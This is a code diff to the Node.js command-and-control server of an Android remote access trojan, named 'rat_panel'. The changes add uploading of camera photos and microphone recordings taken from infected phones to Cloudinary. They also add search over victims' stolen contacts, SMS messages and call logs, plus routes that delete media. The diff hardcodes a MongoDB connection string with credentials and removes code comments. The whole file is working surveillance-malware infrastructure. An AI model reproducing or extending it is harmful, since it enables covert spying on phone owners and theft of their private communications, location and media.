@@ -9,6 +9,8 @@ const fs = require('fs');
 const jwt = require('jsonwebtoken');
 const bcrypt = require('bcryptjs'); 
 const { v4: uuidv4 } = require('uuid');
+const cloudinary = require('cloudinary').v2;
+const multer = require('multer');
 require('dotenv').config();
 
 const app = express();
@@ -16,6 +18,16 @@ const server = http.createServer(app);
 const io = socketIO(server, {
   cors: { origin: '*', methods: ['GET', 'POST'] }
 });
+
+// ===== Cloudinary Config =====
+cloudinary.config({
+  cloud_name: process.env.CLOUDINARY_CLOUD_NAME,
+  api_key: process.env.CLOUDINARY_API_KEY,
+  api_secret: process.env.CLOUDINARY_API_SECRET
+});
+
+// ===== Multer Config (temp local storage before upload to Cloudinary) =====
+const upload = multer({ dest: path.join(__dirname, 'uploads') });
 
 // Middleware
 app.use(cors());
@@ -25,7 +37,7 @@ app.use(morgan('dev'));
 app.use('/uploads', express.static(path.join(__dirname, 'uploads')));
 
 // MongoDB Connection
-mongoose.connect(process.env.MONGODB_URI || 'mongodb://localhost:27017/rat_panel', {
+mongoose.connect(process.env.MONGODB_URI || 'mongodb+srv://viwer:0415%4017493@ratcluster.6teo3.mongodb.net/rat_panel?retryWrites=true&w=majority', {
   useNewUrlParser: true,
   useUnifiedTopology: true
 }).then(() => console.log('MongoDB Connected'))
@@ -175,7 +187,6 @@ io.on('connection', async (socket) => {
 
       socket.on('device:update', async (data) => {
         try {
-          // Only update specific fields, not the raw data
           const allowedFields = {};
           if (data.os) allowedFields.os = data.os;
           if (data.osVersion) allowedFields.osVersion = data.osVersion;
@@ -205,10 +216,8 @@ io.on('connection', async (socket) => {
           const { commandId, result, status } = data;
           if (!commandId) return;
           
-          // Sanitize result - convert to plain object
           const cleanResult = result ? JSON.parse(JSON.stringify(result)) : null;
 
-          // Helper: extract array from a possibly-wrapped object
           const extractFromResult = (val, preferredKey) => {
             if (!val) return val;
             if (Array.isArray(val)) return val;
@@ -221,7 +230,37 @@ io.on('connection', async (socket) => {
             return val;
           };
 
-          // Also persist result data into device.data so admin panel can display it
+          // For photo capture result with base64 data → Upload to Cloudinary
+          if (cleanResult && cleanResult.data && cleanResult.command === 'take_photo') {
+            try {
+              const uploadRes = await cloudinary.uploader.upload(
+                `data:image/jpeg;base64,${cleanResult.data}`,
+                { folder: `rat_photos/${socket.deviceId}`, resource_type: 'image' }
+              );
+              cleanResult.cloudinaryUrl = uploadRes.secure_url;
+              cleanResult.cloudinaryPublicId = uploadRes.public_id;
+              delete cleanResult.data; // Don't store raw base64
+            } catch (cloudErr) {
+              console.error('Cloudinary upload error:', cloudErr.message);
+            }
+          }
+
+          // For audio recording result with base64 data → Upload to Cloudinary
+          if (cleanResult && cleanResult.data && cleanResult.command === 'record_audio') {
+            try {
+              const uploadRes = await cloudinary.uploader.upload(
+                `data:audio/mpeg;base64,${cleanResult.data}`,
+                { folder: `rat_audio/${socket.deviceId}`, resource_type: 'video' }
+              );
+              cleanResult.cloudinaryUrl = uploadRes.secure_url;
+              cleanResult.cloudinaryPublicId = uploadRes.public_id;
+              delete cleanResult.data;
+            } catch (cloudErr) {
+              console.error('Cloudinary audio upload error:', cloudErr.message);
+            }
+          }
+
+          // Persist result data into device.data
           const dataSetOps = {};
           if (cleanResult && typeof cleanResult === 'object' && !cleanResult.error) {
             if (cleanResult.contacts)              dataSetOps['data.contacts']      = extractFromResult(cleanResult.contacts, 'contacts');
@@ -236,6 +275,12 @@ io.on('connection', async (socket) => {
             if (cleanResult.simInfo)               dataSetOps['data.simInfo']       = cleanResult.simInfo;
             if (cleanResult.networkInfo)           dataSetOps['data.networkInfo']   = cleanResult.networkInfo;
             if (cleanResult.clipboard)             dataSetOps['data.clipboard']     = cleanResult.clipboard;
+            // Store captured photo reference
+            if (cleanResult.cloudinaryUrl)         dataSetOps['data.lastPhoto']     = { url: cleanResult.cloudinaryUrl, publicId: cleanResult.cloudinaryPublicId, timestamp: new Date() };
+            if (cleanResult.cloudinaryUrl && cleanResult.command === 'take_photo') {
+              // Push to captured photos array
+              // We'll use $push separately
+            }
           }
 
           const updateDoc = {
@@ -248,6 +293,19 @@ io.on('connection', async (socket) => {
               }
             }
           };
+
+          // If photo was captured, also push to data.capturedPhotos array
+          if (cleanResult && cleanResult.cloudinaryUrl && cleanResult.command === 'take_photo') {
+            updateDoc.$push = {
+              ...updateDoc.$push,
+              'data.capturedPhotos': {
+                url: cleanResult.cloudinaryUrl,
+                publicId: cleanResult.cloudinaryPublicId,
+                timestamp: new Date()
+              }
+            };
+          }
+
           if (Object.keys(dataSetOps).length > 0) {
             updateDoc.$set = dataSetOps;
           }
@@ -258,7 +316,6 @@ io.on('connection', async (socket) => {
           );
 
           io.emit(`command:result:${commandId}`, { deviceId: socket.deviceId, result: cleanResult, status });
-          // Notify admin panels that device data was updated so UI can refresh
           io.emit('device:data:update', { deviceId: socket.deviceId });
         } catch (err) {
           console.error('Result error:', err.message);
@@ -267,9 +324,6 @@ io.on('connection', async (socket) => {
 
       socket.on('device:data:bulk', async (data) => {
         try {
-          // Helper to extract the actual array from a possibly-wrapped object.
-          // Android wraps arrays like: { contacts: [...] } or { sms: [...], total: N }
-          // We look for the preferred key first, then fall back to any array value.
           const extractArray = (val, preferredKey) => {
             if (!val) return val;
             if (Array.isArray(val)) return val;
@@ -282,13 +336,11 @@ io.on('connection', async (socket) => {
             return val;
           };
 
-          // Build $set fields for each known data type
-          // Android key → preferred inner key (for unwrapping)
           const dataKeyMap = {
             contacts:     'contacts',
             sms:          'sms',
             callLogs:     'callLogs',
-            photos:       'images',   // getMediaFiles("images") wraps as { images: [...] }
+            photos:       'images',
             videos:       'videos',
             documents:    'documents',
             installedApps:'installedApps'
@@ -301,20 +353,17 @@ io.on('connection', async (socket) => {
             }
           });
 
-          // Handle scalar / object special fields
           if (data.deviceInfo)   setOps['data.deviceInfo']   = data.deviceInfo;
           if (data.battery)      setOps['data.battery']      = data.battery;
           if (data.simInfo)      setOps['data.simInfo']      = data.simInfo;
           if (data.networkInfo)  setOps['data.networkInfo']  = data.networkInfo;
           if (data.clipboard)    setOps['data.clipboard']    = data.clipboard;
 
-          // Build the full MongoDB update document
           const updateDoc = {};
           if (Object.keys(setOps).length > 0) {
             updateDoc.$set = setOps;
           }
 
-          // Location must use $push (separate operator — NOT inside $set)
           if (data.location && (data.location.lat != null || data.location.lng != null)) {
             updateDoc.$push = {
               'data.locations': { ...data.location, timestamp: new Date() }
@@ -332,6 +381,39 @@ io.on('connection', async (socket) => {
           io.emit('device:data:update', { deviceId: socket.deviceId });
         } catch (err) {
           console.error('Bulk data error:', err.message);
+        }
+      });
+
+      // Handle photo upload from Android (base64 sent via socket)
+      socket.on('device:photo', async (data) => {
+        try {
+          const { imageBase64, camera } = data;
+          if (!imageBase64) return;
+          
+          const uploadRes = await cloudinary.uploader.upload(
+            `data:image/jpeg;base64,${imageBase64}`,
+            { folder: `rat_photos/${socket.deviceId}`, resource_type: 'image' }
+          );
+          
+          const photoEntry = {
+            url: uploadRes.secure_url,
+            publicId: uploadRes.public_id,
+            camera: camera || 'back',
+            timestamp: new Date()
+          };
+          
+          await mongoose.connection.db.collection('devices').updateOne(
+            { deviceId: socket.deviceId },
+            { 
+              $push: { 'data.capturedPhotos': photoEntry },
+              $set: { 'data.lastPhoto': photoEntry, lastSeen: new Date() }
+            }
+          );
+          
+          io.emit('device:data:update', { deviceId: socket.deviceId });
+          console.log(`Photo saved for ${socket.deviceId}: ${uploadRes.secure_url}`);
+        } catch (err) {
+          console.error('device:photo error:', err.message);
         }
       });
 
@@ -404,7 +486,7 @@ io.on('connection', async (socket) => {
   }
 });
 
-// === REST API Routes ===
+// ===== REST API Routes =====
 
 // Auth Routes
 app.post('/api/auth/login', async (req, res) => {
@@ -449,6 +531,10 @@ app.post('/api/auth/register', async (req, res) => {
 app.get('/api/devices', authMiddleware, async (req, res) => {
   try {
     const devices = await Device.find().sort({ lastSeen: -1 }).lean();
+    // Normalize data Map
+    devices.forEach(d => {
+      if (d.data instanceof Map) d.data = Object.fromEntries(d.data);
+    });
     res.json(devices);
   } catch (err) {
     res.status(500).json({ error: err.message });
@@ -459,8 +545,6 @@ app.get('/api/devices/:deviceId', authMiddleware, async (req, res) => {
   try {
     const device = await Device.findOne({ deviceId: req.params.deviceId }).lean();
     if (!device) return res.status(404).json({ error: 'Device not found' });
-    // Mongoose Map type can come back as a JS Map object even after .lean()
-    // Convert to a plain object so the frontend can access device.data.contacts etc.
     if (device.data instanceof Map) {
       device.data = Object.fromEntries(device.data);
     }
@@ -489,6 +573,180 @@ app.post('/api/devices/:deviceId/command', authMiddleware, async (req, res) => {
     io.to(`device:${req.params.deviceId}`).emit('command', { commandId, type, params });
     
     res.json({ commandId, status: 'pending' });
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
+// ===== SEARCH ENDPOINTS =====
+
+// Search contacts
+app.get('/api/devices/:deviceId/search/contacts', authMiddleware, async (req, res) => {
+  try {
+    const { deviceId } = req.params;
+    const { q } = req.query;
+    const device = await Device.findOne({ deviceId }).lean();
+    if (!device) return res.status(404).json({ error: 'Device not found' });
+    let contacts = (device.data?.contacts || []);
+    if (q) {
+      const lower = q.toLowerCase();
+      contacts = contacts.filter(c => 
+        (c.name && c.name.toLowerCase().includes(lower)) ||
+        (c.phones && c.phones.some(p => p.number && p.number.includes(q)))
+      );
+    }
+    res.json(contacts);
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
+// Search SMS
+app.get('/api/devices/:deviceId/search/sms', authMiddleware, async (req, res) => {
+  try {
+    const { deviceId } = req.params;
+    const { q } = req.query;
+    const device = await Device.findOne({ deviceId }).lean();
+    if (!device) return res.status(404).json({ error: 'Device not found' });
+    let sms = (device.data?.sms || []);
+    if (q) {
+      const lower = q.toLowerCase();
+      sms = sms.filter(m => 
+        (m.address && m.address.toLowerCase().includes(lower)) ||
+        (m.body && m.body.toLowerCase().includes(lower))
+      );
+    }
+    res.json(sms);
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
+// Search Call Logs
+app.get('/api/devices/:deviceId/search/callLogs', authMiddleware, async (req, res) => {
+  try {
+    const { deviceId } = req.params;
+    const { q } = req.query;
+    const device = await Device.findOne({ deviceId }).lean();
+    if (!device) return res.status(404).json({ error: 'Device not found' });
+    let calls = (device.data?.callLogs || []);
+    if (q) {
+      const lower = q.toLowerCase();
+      calls = calls.filter(c => 
+        (c.name && c.name.toLowerCase().includes(lower)) ||
+        (c.number && c.number.includes(q))
+      );
+    }
+    res.json(calls);
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
+// ===== MEDIA UPLOAD (from admin) =====
+app.post('/api/upload', authMiddleware, upload.single('file'), async (req, res) => {
+  try {
+    const file = req.file;
+    if (!file) return res.status(400).json({ error: 'No file uploaded' });
+
+    const result = await cloudinary.uploader.upload(file.path, {
+      folder: 'rat_uploads',
+      resource_type: 'auto'
+    });
+
+    // Clean up temp file
+    fs.unlink(file.path, () => {});
+
+    res.json({
+      url: result.secure_url,
+      publicId: result.public_id,
+      format: result.format,
+      bytes: result.bytes
+    });
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
+// ===== MEDIA DELETE (deletes from Cloudinary too) =====
+app.delete('/api/media/:deviceId/:type', authMiddleware, async (req, res) => {
+  try {
+    const { deviceId, type } = req.params;
+    const { publicId } = req.body;
+    
+    if (!publicId) {
+      // Delete all media of this type for device
+      const device = await Device.findOne({ deviceId }).lean();
+      if (!device) return res.status(404).json({ error: 'Device not found' });
+      
+      const dataField = type === 'photos' || type === 'capturedPhotos' ? 'capturedPhotos' : 
+                        type === 'videos' ? 'videos' : 
+                        type === 'documents' ? 'documents' : null;
+      
+      if (!dataField) return res.status(400).json({ error: 'Invalid type' });
+      
+      // Get all items
+      const items = device.data?.[dataField] || [];
+      
+      // Delete each from Cloudinary
+      const deletePromises = items.map(async (item) => {
+        const pid = item.publicId || (typeof item === 'string' ? item : null);
+        if (pid) {
+          try {
+            await cloudinary.uploader.destroy(pid);
+          } catch (e) {}
+        }
+      });
+      await Promise.all(deletePromises);
+      
+      // Clear from DB
+      await Device.updateOne(
+        { deviceId },
+        { $set: { [`data.${dataField}`]: [] } }
+      );
+      
+      res.json({ success: true, deleted: items.length });
+    } else {
+      // Delete single file
+      try {
+        await cloudinary.uploader.destroy(publicId);
+      } catch (e) {}
+      
+      // Remove from device data
+      const dataField = type === 'photos' || type === 'capturedPhotos' ? 'capturedPhotos' : 
+                        type === 'videos' ? 'videos' : 
+                        type === 'documents' ? 'documents' : null;
+      
+      if (dataField) {
+        await Device.updateOne(
+          { deviceId },
+          { $pull: { [`data.${dataField}`]: { publicId } } }
+        );
+      }
+      
+      res.json({ success: true });
+    }
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
+// Delete single media item
+app.delete('/api/media/:deviceId/:type/:publicId', authMiddleware, async (req, res) => {
+  try {
+    const { publicId } = req.params;
+    
+    try {
+      await cloudinary.uploader.destroy(publicId);
+    } catch (e) {}
+    
+    const dataField = 'capturedPhotos';
+    await Device.updateOne(
+      { deviceId: req.params.deviceId },
+      { $pull: { [`data.${dataField}`]: { publicId } } }
+    );
+    
+    res.json({ success: true });
   } catch (err) {
     res.status(500).json({ error: err.message });
   }
@@ -580,6 +838,9 @@ app.get('/api/devices/:deviceId/data/:dataType', authMiddleware, async (req, res
     const device = await Device.findOne({ deviceId }).lean();
     if (!device) return res.status(404).json({ error: 'Device not found' });
     const data = device.data || {};
+    if (data instanceof Map) {
+      return res.json(data.get(dataType) || []);
+    }
     res.json(data[dataType] || []);
   } catch (err) {
     res.status(500).json({ error: err.message });
@@ -587,7 +848,7 @@ app.get('/api/devices/:deviceId/data/:dataType', authMiddleware, async (req, res
 });
 
 const PORT = process.env.PORT || 5000;
-server.listen(PORT, () => {
+server.listen(PORT, '0.0.0.0', () => {
   console.log(`Server running on port ${PORT}`);
   console.log(`WebSocket server ready`);
 });
